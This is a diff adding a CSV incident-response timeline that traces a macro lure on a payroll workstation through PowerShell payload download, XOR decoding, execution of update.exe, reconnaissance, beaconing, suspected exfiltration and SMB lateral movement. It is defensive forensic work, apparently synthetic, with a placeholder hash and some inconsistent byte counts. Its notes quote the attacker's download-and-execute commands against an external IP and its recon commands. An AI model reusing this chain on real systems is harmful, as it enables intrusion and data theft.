@@ -1,0 +1,41 @@
+Time (UTC),Source Artifact,Event Description,Significance,Confidence,Notes
+2024-11-14 14:18:55.0000000,JumpList,User opened Q4_Payroll_Review.xlsm via Excel,lure-open,MEDIUM,Jump list (Microsoft Excel) target=C:\Users\payroll-admin\Documents\Q4_Payroll_Review.xlsm
+2024-11-14 14:18:55.0000000,Prefetch,EXCEL.EXE executed (run count 68),lure-open,HIGH,Confirms execution; high run count indicates legitimate routine use of Excel
+2024-11-14 14:18:55.0214821,Security,EXCEL.EXE process created (parent OUTLOOK.EXE),lure-open,HIGH,EID 4688; user=payroll-admin; parent=OUTLOOK.EXE; suggests xlsm opened from email
+2024-11-14 14:18:55.5000000,LNK,Recent LNK created for Q4_Payroll_Review.xlsm,lure-open,HIGH,C:\Users\payroll-admin\AppData\Roaming\Microsoft\Windows\Recent\Q4_Payroll_Review.lnk; target=Documents\Q4_Payroll_Review.xlsm
+2024-11-14 14:18:56.0000000,MFT,Excel owner lock file created in Temp,lure-open,HIGH,Users\payroll-admin\AppData\Local\Temp\~$Q4_Payroll_Review.xlsm; sz=165; normal Excel behavior
+2024-11-14 14:18:57.0000000,MFT,VBE folder created in Temp by Excel,macro-prep,MEDIUM,Users\payroll-admin\AppData\Local\Temp\VBE; characteristic of VBA macro initialization
+2024-11-14 14:18:58.0000000,MFT,MSForms.exd cache dropped (VBA UserForm),macro-prep,MEDIUM,Users\payroll-admin\AppData\Local\Temp\VBE\MSForms.exd; sz=21471; consistent with macro UserForm
+2024-11-14 14:19:38.0000000,Prefetch,POWERSHELL.EXE executed (run count 3),suspicious-parent,HIGH,Low run count for an interactive workstation; corroborates 4688 above
+2024-11-14 14:19:38.4218921,Security,POWERSHELL.EXE spawned by OUTLOOK.EXE,suspicious-parent,HIGH,EID 4688; PID 0x5128; parent=OUTLOOK.EXE; abnormal — Office should not spawn PowerShell
+2024-11-14 14:19:38.4218921,PowerShell,"PS pipeline begin (ConsoleHost, payroll-admin)",c2-staging,HIGH,EID 4103; ConsoleHost; user FINANCE\payroll-admin; ScriptName= (no script — interactive)
+2024-11-14 14:19:38.4842184,PowerShell,Invoke-WebRequest to 91.214.47.22 -> Temp\a.tmp,c2-staging,HIGH,EID 4104 ScriptBlock: Invoke-WebRequest -Uri 'https://91.214.47.22/h/u.t' -OutFile $env:TEMP\a.tmp
+2024-11-14 14:19:38.5811542,Security,cmd.exe spawned by powershell.exe,execution,HIGH,EID 4688; PID 0x5184; parent=powershell.exe; subsequent activity will use cmd
+2024-11-14 14:19:42.0000000,Network,TCP/443 to 91.214.47.22 from powershell.exe,c2-comm,HIGH,10.0.4.32:52914 -> 91.214.47.22:443; out=1847 in=184221; flow note: 'first observation of this IP'
+2024-11-14 14:19:42.6000000,MFT,Encrypted payload a.tmp created in Temp,staging,HIGH,Users\payroll-admin\AppData\Local\Temp\a.tmp; sz=174080; written by Invoke-WebRequest until 14:19:48
+2024-11-14 14:20:07.6000000,PowerShell,XOR-decode of a.tmp using key 'F1nd4nc3K3y!',deobfuscation,HIGH,"EID 4104 ScriptBlock: $bytes = Get-Content $env:TEMP\a.tmp -Encoding Byte; bxor with key 'F1nd4nc3K3y!'; writes b.tmp, removes a.tmp"
+2024-11-14 14:20:11.0000000,MFT,update.exe materialized in user's Temp,staging,HIGH,Users\payroll-admin\AppData\Local\Temp\update.exe; sz=174080; InUse=False (already deleted at collection)
+2024-11-14 14:20:11.0000000,Amcache,update.exe registered in Amcache (sha1 captured),execution,HIGH,FullPath=...\Temp\update.exe; sha1=a1b2c3d4e5f6789012345678901234567890abcd; first-seen indicator
+2024-11-14 14:20:11.1000000,USN,a.tmp deleted (post-decode cleanup),anti-forensics,HIGH,FileDelete; Users\payroll-admin\AppData\Local\Temp\a.tmp; cleared after decoding
+2024-11-14 14:20:11.2000000,PowerShell,Move-Item b.tmp -> update.exe,staging,HIGH,EID 4104 ScriptBlock: Move-Item $env:TEMP\b.tmp $env:TEMP\update.exe -Force
+2024-11-14 14:20:11.5000000,USN,b.tmp renamed to update.exe,staging,HIGH,RenameNewName Users\payroll-admin\AppData\Local\Temp\update.exe; matches PS Move-Item above
+2024-11-14 14:21:02.5000000,PowerShell,Start-Process update.exe,execution,HIGH,EID 4104 ScriptBlock: Start-Process $env:TEMP\update.exe (immediately before Prefetch first run)
+2024-11-14 14:21:03.0000000,Prefetch,update.exe FIRST execution (run count 1),pivot,HIGH,UPDATE.EXE-89A4B22C.pf; run count 1 — confirms first-time execution; corroborated by Security 4688 and MFT/USN
+2024-11-14 14:21:03.0000000,USN,Prefetch file UPDATE.EXE-89A4B22C.pf created,pivot,HIGH,Windows\System32\Prefetch\UPDATE.EXE-89A4B22C.pf; OS-side evidence of execution
+2024-11-14 14:21:03.4214582,Security,update.exe process created (parent cmd.exe),pivot,HIGH,EID 4688; PID 0x5421; NewProcessName=...\Temp\update.exe; parent=cmd.exe
+2024-11-14 14:21:48.0000000,Security,ipconfig /all spawned by update.exe,discovery,HIGH,EID 4688; parent=update.exe; CommandLine='ipconfig /all' — host-info reconnaissance
+2024-11-14 14:21:48.0000000,Network,TCP/443 to 91.214.47.22 from update.exe (beacon),c2-comm,HIGH,10.0.4.32:52915 -> 91.214.47.22:443; out=4218 in=18421; small bidirectional — beacon
+2024-11-14 14:21:55.0000000,Security,nltest /domain_trusts spawned by update.exe,discovery,HIGH,EID 4688; parent=update.exe; CommandLine='nltest /domain_trusts' — domain reconnaissance
+2024-11-14 14:21:55.0000000,Network,Large outbound TCP/443 to 91.214.47.22,exfil-candidate,HIGH,10.0.4.32:52916 -> 91.214.47.22:443; out=184221 in=2415891; flow note 'possible exfil'
+2024-11-14 14:22:14.0000000,Security,'net group Domain Admins /domain' run by update.exe,discovery,HIGH,"EID 4688; parent=update.exe; CommandLine=net group ""Domain Admins"" /domain"
+2024-11-14 14:22:42.0000000,Security,'arp -a' run by update.exe,discovery,HIGH,EID 4688; parent=update.exe; ARP cache enumeration for lateral targets
+2024-11-14 14:23:44.0000000,USN,update.exe deleted from Temp (cleanup),anti-forensics,HIGH,FileDelete Users\payroll-admin\AppData\Local\Temp\update.exe; corroborates MFT InUse=False
+2024-11-14 14:30:00.0000000,SRUM,SRUM rollup: powershell.exe sent 128421 / recv 1842184,c2-comm,HIGH,Hourly SRUM bucket attributes the initial Invoke-WebRequest fetch volume to powershell.exe
+2024-11-14 14:30:00.0000000,SRUM,SRUM rollup: update.exe sent 184221 / recv 2415891,exfil-candidate,HIGH,Independent corroboration of the 14:21:55 outbound flow; same byte counts under same process — high-confidence cross-source agreement
+2024-11-14 14:31:05.4218421,Security,Network logon (type 3) from 10.0.4.17,lateral-move,HIGH,EID 4624; LogonType=3; NtLmSsp; src=10.0.4.17 — adversary-controlled pivot host (NOT FILESVR-03; FILESVR-03 is 10.0.4.18)
+2024-11-14 14:33:00.0000000,Security,Local group membership enumerated by update.exe,discovery,HIGH,EID 4798; CallerProcessName=...\Temp\update.exe; targets payroll-admin's groups
+2024-11-14 14:33:18.0000000,Network,SMB/445 to FILESVR-03 (10.0.4.18),lateral-move,HIGH,10.0.4.32:49221 -> 10.0.4.18:445; aligned with EID 4648; 'net use' traffic
+2024-11-14 14:33:18.4218421,Security,Explicit-credential logon attempt to FILESVR-03,lateral-move,HIGH,EID 4648; TargetServer=FILESVR-03; ProcessName=cmd.exe; user=payroll-admin
+2024-11-14 14:33:19.0124211,Security,'net use \\FILESVR-03\Finance' executed,lateral-move,HIGH,EID 4688; parent=cmd.exe; CommandLine includes net use \\FILESVR-03\Finance
+2024-11-14 14:33:42.0000000,Network,Large SMB/445 transfer to FILESVR-03,"lateral-move,exfil-candidate",HIGH,10.0.4.32:49222 -> 10.0.4.18:445; out=184221; flow note 'file enumeration'
+2024-11-14 14:38:00.0000000,Security,Network session 4624 from 10.0.4.17 logged off,noise,MEDIUM,EID 4634; TargetUserName=payroll-admin; LogonType=3; bookend of the inbound session
